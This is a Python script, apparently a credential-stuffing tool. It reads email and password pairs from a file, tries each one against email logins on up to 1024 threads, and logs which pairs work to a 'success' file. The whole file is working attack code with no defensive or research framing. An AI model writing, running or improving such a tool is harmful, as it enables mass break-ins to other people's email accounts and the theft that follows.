#!/usr/bin/python3.3
import sys
import logging
import threading
import functools

from queue import Queue

import email_login as el

emailLogin = el.EmailLogin()


def coroutine(func):

    @functools.wraps(func)
    def start(*args, **kwargs):
        cr = func(*args, **kwargs)
        next(cr)
        return cr
    return start


class Scanner(object):

    success = open("success", "a+")
    fail = open("fail", "a+")
    ignore = open("ignore", "a+")

    def __init__(self, maxThread=1024):
        self.maxThread = maxThread
        self.emailQueue = Queue()
        self.writelock = threading.Lock()

        for i in range(self.maxThread):
            t = threading.Thread(target=self._worker)
            t.setDaemon(True)
            t.start()

    @coroutine
    def __call__(self):
        while True:
            task = yield
            self.emailQueue.put(task)

    # does it make sense or just self.emailQueue.put(task) FIXME
    def send(self, *args, **kwargs):
        self().send(*args, **kwargs)

    def _writeToFile(self, email, password, result):
        with self.writelock:
            f = getattr(self, result)
            f.write(email + ' ' + password + '\n')
            f.flush()

    def _worker(self):
        while True:
            email, password = self.emailQueue.get()

            try:
                if emailLogin.login(email, password):
                    print("Success")
                    result = 'success'
                else:
                    print("Fail")
                    result = 'fail'
            except el.emailDomainNotFind as e:
                result = 'ignore'
                logging.error(e.msg)
            except el.emailFormatError:
                return

            self._writeToFile(email, password, result)
            self.emailQueue.task_done()

    def join(self):
        self.emailQueue.join()


if __name__ == '__main__':
    filename = sys.argv[1]
    scanner = Scanner()

    with open(filename, "r") as filehandle:
        while True:
            line = filehandle.readline()

            if not line:
                break

            content = line.split(' ')

            if len(content) == 2:
                email = content[0].strip().lower()
                password = content[1].strip().lower()
                scanner.send((email, password))

    scanner.join()
